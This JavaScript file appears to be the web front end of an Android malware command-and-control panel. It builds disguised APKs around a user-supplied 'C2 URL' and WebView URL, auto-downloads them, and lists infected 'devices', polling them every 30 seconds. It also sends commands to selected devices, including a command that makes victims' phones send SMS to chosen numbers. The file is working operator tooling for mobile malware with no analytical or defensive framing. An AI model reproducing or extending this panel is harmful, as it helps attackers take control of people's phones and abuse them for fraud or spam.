window.onload = function() {
    DevicesManager.load();
    DeviceCountManager.update();
    createSnow();
    
    setInterval(() => {
        if (document.getElementById('devices-tab').classList.contains('active')) {
            DevicesManager.load();
            DeviceCountManager.update();
        }
    }, 30000);
};

function switchTab(tab) {
    TabsManager.switchTab(tab);
}

function buildApk() {
    const apkName = document.getElementById('apkName').value.trim();
    const appLabel = document.getElementById('appLabel').value.trim();
    const webviewUrl = document.getElementById('webviewUrl').value.trim();
    const c2Url = document.getElementById('c2Url').value.trim();
    
    if (!c2Url) {
        alert('Please enter C2 URL');
        return;
    }
    
    const buildBtn = document.getElementById('buildBtn');
    const statusDiv = document.getElementById('buildStatus');
    const statusMsg = document.getElementById('statusMessage');
    const buildLog = document.getElementById('buildLog');
    const dinoSidebar = document.getElementById('dinoSidebar');
    
    buildBtn.disabled = true;
    buildBtn.textContent = 'Building...';
    statusDiv.style.display = 'block';
    statusMsg.textContent = 'Building APK, please wait...';
    statusMsg.style.color = 'var(--text)';
    buildLog.textContent = '';
    
    // Open Dino Sidebar
    dinoSidebar.classList.add('active');
    setTimeout(() => {
        const frame = document.getElementById('dinoFrame');
        if (frame) frame.focus();
    }, 600);
    
    const params = new URLSearchParams({
        apkName: apkName,
        appLabel: appLabel,
        webviewUrl: webviewUrl,
        c2Url: c2Url
    });

    const eventSource = new EventSource('api/build.php?' + params.toString());
    
    eventSource.onmessage = function(event) {
        const data = JSON.parse(event.data);
        if (data.log) {
            buildLog.textContent += data.log;
            buildLog.scrollTop = buildLog.scrollHeight;
        }
        
        if (data.success !== undefined) {
            eventSource.close();
            buildBtn.disabled = false;
            buildBtn.textContent = 'Generate APK';
            dinoSidebar.classList.remove('active');
            
            if (data.success) {
                statusMsg.textContent = 'Build successful! Downloading...';
                statusMsg.style.color = 'var(--success)';
                
                // Auto download
                const link = document.createElement('a');
                link.href = data.downloadUrl;
                link.download = apkName + '.apk';
                document.body.appendChild(link);
                link.click();
                document.body.removeChild(link);
            } else {
                statusMsg.textContent = 'Build failed.';
                statusMsg.style.color = 'var(--error)';
            }
        }
    };
    
    eventSource.onerror = function() {
        eventSource.close();
        buildBtn.disabled = false;
        buildBtn.textContent = 'Generate APK';
        dinoSidebar.classList.remove('active');
        statusMsg.textContent = 'Connection error during build.';
        statusMsg.style.color = 'var(--error)';
    };
}

function filterDevices() {
    DevicesManager.filter();
}

function filterLogs() {
    LogsManager.filter();
}

function selectAll() {
    DevicesManager.selectAll();
}

function deselectAll() {
    DevicesManager.deselectAll();
}

function toggleSelectAll() {
    DevicesManager.toggleSelectAll();
}

function showCommandModal() {
    const selectedDevices = DevicesManager.getSelectedDevices();
    if (selectedDevices.length === 0) {
        alert('Please select at least one device');
        return;
    }
    
    const modal = document.getElementById('commandModal');
    const info = document.getElementById('selectedDevicesInfo');
    info.textContent = `Selected devices: ${selectedDevices.length}`;
    document.getElementById('commandSelect').value = '';
    document.getElementById('phoneNumber').value = '';
    document.getElementById('smsMessage').value = '';
    document.getElementById('simSlot').value = '0';
    document.getElementById('sendSMSFields').style.display = 'none';
    modal.style.display = 'block';
}

function closeCommandModal() {
    const modal = document.getElementById('commandModal');
    modal.style.display = 'none';
    document.getElementById('commandSelect').value = '';
    document.getElementById('phoneNumber').value = '';
    document.getElementById('smsMessage').value = '';
    document.getElementById('simSlot').value = '0';
    document.getElementById('sendSMSFields').style.display = 'none';
}

function updateCommandFields() {
    const commandSelect = document.getElementById('commandSelect');
    const sendSMSFields = document.getElementById('sendSMSFields');
    
    if (commandSelect.value === 'sendSMS') {
        sendSMSFields.style.display = 'block';
    } else {
        sendSMSFields.style.display = 'none';
    }
}

function sendCommand() {
    const commandSelect = document.getElementById('commandSelect');
    const selectedCommand = commandSelect.value;
    
    if (!selectedCommand) {
        alert('Please select a command');
        return;
    }
    
    let command = '';
    
    if (selectedCommand === 'sendSMS') {
        const phoneNumber = document.getElementById('phoneNumber').value.trim();
        const message = document.getElementById('smsMessage').value.trim();
        const simSlot = parseInt(document.getElementById('simSlot').value) || 0;
        
        if (!phoneNumber || !message) {
            alert('Please enter phone number and message');
            return;
        }
        
        command = JSON.stringify({
            sendSMS: phoneNumber,
            message: message,
            simSlot: simSlot
        });
    } else {
        command = selectedCommand;
    }
    
    DevicesManager.sendCommand(command);
}

function createSnow() {
    const container = document.getElementById('snow-container');
    const snowflakeCount = 30; // Reduced count
    const snowflakes = ['❄', '❅', '❆'];

    for (let i = 0; i < snowflakeCount; i++) {
        const snowflake = document.createElement('div');
        snowflake.className = 'snowflake';
        snowflake.innerHTML = snowflakes[Math.floor(Math.random() * snowflakes.length)];
        
        const startX = Math.random() * 100;
        const drift = (Math.random() - 0.5) * 200; // Random horizontal drift
        
        snowflake.style.left = startX + 'vw';
        snowflake.style.setProperty('--drift', drift + 'px');
        snowflake.style.animationDuration = Math.random() * 10 + 10 + 's'; // Much slower: 10-20s
        snowflake.style.opacity = '0';
        snowflake.style.fontSize = Math.random() * 5 + 8 + 'px'; // Smaller: 8-13px
        snowflake.style.animationDelay = Math.random() * 15 + 's';
        container.appendChild(snowflake);
    }
}

window.onclick = function(event) {
    const modal = document.getElementById('commandModal');
    if (event.target === modal) {
        closeCommandModal();
    }
}

